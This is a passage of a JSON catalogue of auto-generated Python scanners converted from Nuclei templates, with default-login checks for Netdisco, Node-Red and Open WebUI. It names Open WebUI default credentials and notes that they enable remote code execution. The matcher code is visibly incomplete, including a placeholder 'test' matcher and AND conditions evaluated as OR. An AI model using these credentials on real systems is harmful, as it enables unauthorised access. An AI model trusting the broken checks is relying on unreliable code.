        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: netdisco-default-login\nName: Netdisco Admin - Default Login\nSeverity: critical\nDescription: Detects use of hard-coded credentials in Netdisco.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_netdisco_default_login:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"netdisco-default-login\"\n    SEVERITY = \"critical\"\n    NAME = \"Netdisco Admin - Default Login\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(body, \"User Management\", \"/admin/discoverall\", \"Logged in as\"); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Netdisco Admin - Default Login\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_netdisco_default_login(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "netdisco",
          "default-login",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_nodered_default_login",
        "name": "Node-Red - Default Login",
        "language": "Python",
        "famille": "Auth",
        "description": "Allows attacker to log in and execute RCE on the Node-Red panel using the default credentials.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'access_token\":, expires_in\":, token_type\":' | mot(s) 'application/json' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: nodered-default-login\nName: Node-Red - Default Login\nSeverity: critical\nDescription: Allows attacker to log in and execute RCE on the Node-Red panel using the default credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_nodered_default_login:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"nodered-default-login\"\n    SEVERITY = \"critical\"\n    NAME = \"Node-Red - Default Login\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'access_token\":, expires_in\":, token_type\":\\' | mot(s) \\'application/json\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['access_token\":, expires_in\":, token_type\":', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Node-Red - Default Login\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_nodered_default_login(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: nodered-default-login\nName: Node-Red - Default Login\nSeverity: critical\nDescription: Allows attacker to log in and execute RCE on the Node-Red panel using the default credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_nodered_default_login:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"nodered-default-login\"\n    SEVERITY = \"critical\"\n    NAME = \"Node-Red - Default Login\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'access_token\":, expires_in\":, token_type\":\\' | mot(s) \\'application/json\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['access_token\":, expires_in\":, token_type\":', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Node-Red - Default Login\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_nodered_default_login(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "default-login",
          "node-red",
          "dashboard",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_openwebui_default_login",
        "name": "Open WebUI - Default Login",
        "language": "Python",
        "famille": "Auth",
        "description": "Detected the presence of an OpenWebUI panel with default credentials (admin@localhost/admin). Successful authentication using these default credentials allows attackers to access the admin interface and potentially perform remote code execution by defining a custom \"tool\".",
        "severity": "critical",
        "detection": "[AND] mot(s) 'token\":, role\":, token_type\":' | mot(s) 'application/json' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "admin@localhost"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "admin"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: openwebui-default-login\nName: Open WebUI - Default Login\nSeverity: critical\nDescription: Detected the presence of an OpenWebUI panel with default credentials (admin@localhost/admin). Successful authentication using these default credentials allows attackers to access the admin interface and potentially perform remote code execution by defining a custom \"tool\".\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_openwebui_default_login:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"openwebui-default-login\"\n    SEVERITY = \"critical\"\n    NAME = \"Open WebUI - Default Login\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'token\":, role\":, token_type\":\\' | mot(s) \\'application/json\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['token\":, role\":, token_type\":', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Open WebUI - Default Login\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_openwebui_default_login(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: openwebui-default-login\nName: Open WebUI - Default Login\nSeverity: critical\nDescription: Detected the presence of an OpenWebUI panel with default credentials (admin@localhost/admin). Successful authentication using these default credentials allows attackers to access the admin interface and potentially perform remote code execution by defining a custom \"tool\".\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_openwebui_default_login:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"openwebui-default-login\"\n    SEVERITY = \"critical\"\n    NAME = \"Open WebUI - Default Login\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'token\":, role\":, token_type\":\\' | mot(s) \\'application/json\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['token\":, role\":, token_type\":', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Open WebUI - Default Login\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_openwebui_default_login(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "default-login",
          "vuln",
          "openwebui"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_concrete5_install",
        "name": "Concrete5 Install Panel",
        "language": "Python",
        "famille": "AdminPanel",
        "description": "A Concrete5 installation panel was discovered.",
        "severity": "critical",
        "detection": "[AND] mot(s) '<title>Install concrete5</title>' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
